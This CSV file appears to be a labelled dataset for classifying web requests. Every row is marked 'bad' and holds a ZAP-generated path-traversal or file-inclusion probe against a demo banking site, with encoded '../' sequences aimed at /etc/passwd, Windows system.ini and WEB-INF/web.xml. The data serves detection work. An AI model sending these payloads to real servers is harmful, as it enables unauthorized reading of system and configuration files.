method,path,body,single_q,double_q,dashes,braces,spaces,badwords_count,class
POST,b'/sendFeedback',b'cfile=c%3A%5C&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%2F',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/disclaimer.htm?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=c%3A%2FWindows%2Fsystem.ini',b'',0,0,0,0,3,1,bad
GET,b'/default.jsp?content=c%3A%2F',b'',0,0,0,0,0,0,bad
GET,b'/pr',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=%2F&template=US',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=c%3A%5C',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&btnSubmit=Subscribe',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=c%3A%2F',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini',b'',0,0,0,0,3,1,bad
GET,b'/images/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=%2F',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%2Fetc%2Fpasswd&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=c%3A%5C&template=US',b'',0,0,0,0,0,0,bad
GET,b'/static',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=c%3A%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/disclaimer.htm?url=%2F',b'',0,0,0,0,0,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=c%3A%5CWindows%5Csystem.ini',b'',0,0,0,0,3,1,bad
GET,b'/images/index.jsp?content=c%3A%2F',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=c%3A%5C',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&template=US',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=c%3A%5C',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=c%3A%2F&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=WEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=c%3A%2F&btnSubmit=Subscribe',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/index.jsp?content=c%3A%2F',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini',b'',0,0,0,0,3,1,bad
GET,b'/static/index.jsp?content=c%3A%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/default.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=%2F',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=c%3A%2F&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=WEB-INF%2Fweb.xml&template=US',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,0,0,bad
GET,b'/swagger',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=c%3A%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=WEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%2F',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%2Fetc%2Fpasswd',b'',0,0,0,0,3,0,bad
GET,b'/static/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=c%3A%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/default.jsp?content=WEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=c%3A%5C',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=WEB-INF%5Cweb.xml&template=US',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%2F&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=WEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2F&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/doSubscribe',b'txtEmail=%2F&btnSubmit=Subscribe',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/static/index.jsp?content=c%3A%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',b'',0,0,0,0,3,0,bad
GET,b'/index.jsp?content=c%3A%5C',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=WEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=%2FWEB-INF%2Fweb.xml&template=US',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=WEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=c%3A%5C&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=c%3A%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%5CWEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=c%3A%2F',b'',0,0,0,0,3,0,bad
GET,b'/default.jsp?content=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=%5CWEB-INF%5Cweb.xml&template=US',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=WEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=thishouldnotexistandhopefullyitwillnot',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=c%3A%5C&btnSubmit=Subscribe',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=c%3A%5C&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/index.jsp?content=WEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%2F',b'',0,0,0,0,3,0,bad
GET,b'/search.jsp?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=thishouldnotexistandhopefullyitwillnot&template=US',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=%5CWEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=%5CWEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=index.jsp',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=WEB-INF%2Fweb.xml&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=WEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=WEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=c%3A%2F',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=c%3A%5C',b'',0,0,0,0,3,0,bad
GET,b'/Privacypolicy.jsp?sec=Privacypolicy.jsp&template=US',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=thishouldnotexistandhopefullyitwillnot',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=WEB-INF%5Cweb.xml&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=thishouldnotexistandhopefullyitwillnot',b'',0,0,0,0,0,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%2Findex.jsp',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&btnSubmit=Subscribe',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/static/index.jsp?content=c%3A%2F',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=%2F',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,3,0,bad
GET,b'/Privacypolicy.jsp?sec=%2FPrivacypolicy.jsp&template=US',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%2FWEB-INF%2Fweb.xml&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=default.jsp',b'',0,0,0,0,0,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%5Cindex.jsp',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=c%3A%2F',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=%5CWEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%5CWEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=c%3A%5C',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=%2F',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=%5CPrivacypolicy.jsp&template=US',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=WEB-INF%2Fweb.xml',b'',0,0,0,0,3,0,bad
GET,b'/index.jsp?content=%5CWEB-INF%5Cweb.xml&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=%2Fdefault.jsp',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=WEB-INF%2Fweb.xml&btnSubmit=Subscribe',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=%2F',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=thishouldnotexistandhopefullyitwillnot',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=WEB-INF%2Fweb.xml&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/index.jsp?content=thishouldnotexistandhopefullyitwillnot',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=c%3A%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=WEB-INF%5Cweb.xml',b'',0,0,0,0,3,0,bad
GET,b'/search.jsp?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=c%3A%5C',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=thishouldnotexistandhopefullyitwillnot&job=MortgageLendingAccountExecutive%3ASales',b'',0,0,0,0,0,0,bad
GET,b'/default.jsp?content=%5Cdefault.jsp',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=c%3A%5C',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=index.jsp',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/static/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=WEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,3,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=c%3A%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/survey_questions.jsp?step=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,0,0,bad
GET,b'/images/index.jsp?content=%2Findex.jsp',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=WEB-INF%5Cweb.xml&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=WEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=c%3A%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%5CWEB-INF%5Cweb.xml',b'',0,0,0,0,3,0,bad
GET,b'/static/index.jsp?content=WEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=WEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/images/index.jsp?content=%5Cindex.jsp',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=thishouldnotexistandhopefullyitwillnot',b'',0,0,0,0,3,0,bad
GET,b'/search.jsp?query=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/survey_questions.jsp?step=WEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=c%3A%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/static/index.jsp?content=WEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%2FWEB-INF%2Fweb.xml&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=index.jsp',b'',0,0,0,0,3,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=%5CWEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini',b'',0,0,0,0,0,1,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%2Findex.jsp',b'',0,0,0,0,3,0,bad
GET,b'/search.jsp?query=thishouldnotexistandhopefullyitwillnot',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=%5CWEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=%5CWEB-INF%5Cweb.xml&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=c%3A%2F',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%5Cindex.jsp',b'',0,0,0,0,3,0,bad
GET,b'/static/index.jsp?content=thishouldnotexistandhopefullyitwillnot',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=%2F',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=c%3A%2F',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=index.jsp',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=thishouldnotexistandhopefullyitwillnot&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=c%3A%5C',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=%2F',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=%2Findex.jsp',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=c%3A%5C',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=%5Cindex.jsp',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=c%3A%2FWindows%2Fsystem.ini&btnSubmit=Login',0,0,0,0,0,2,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=WEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&btnSubmit=Login',0,0,0,0,0,2,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=WEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=%2FWEB-INF%2Fweb.xml',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=c%3A%5CWindows%5Csystem.ini&btnSubmit=Login',0,0,0,0,0,2,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=%5CWEB-INF%5Cweb.xml',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=thishouldnotexistandhopefullyitwillnot',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&btnSubmit=Login',0,0,0,0,0,2,bad
POST,b'/doLogin',b'uid=ZAP&passw=%2Fetc%2Fpasswd&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=c%3A%2FWindows%2Fsystem.ini&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,1,bad
POST,b'/doLogin',b'uid=ZAP&passw=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=c%3A%5CWindows%5Csystem.ini&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,1,bad
POST,b'/doLogin',b'uid=ZAP&passw=c%3A%2F&btnSubmit=Login',0,0,0,0,0,1,bad
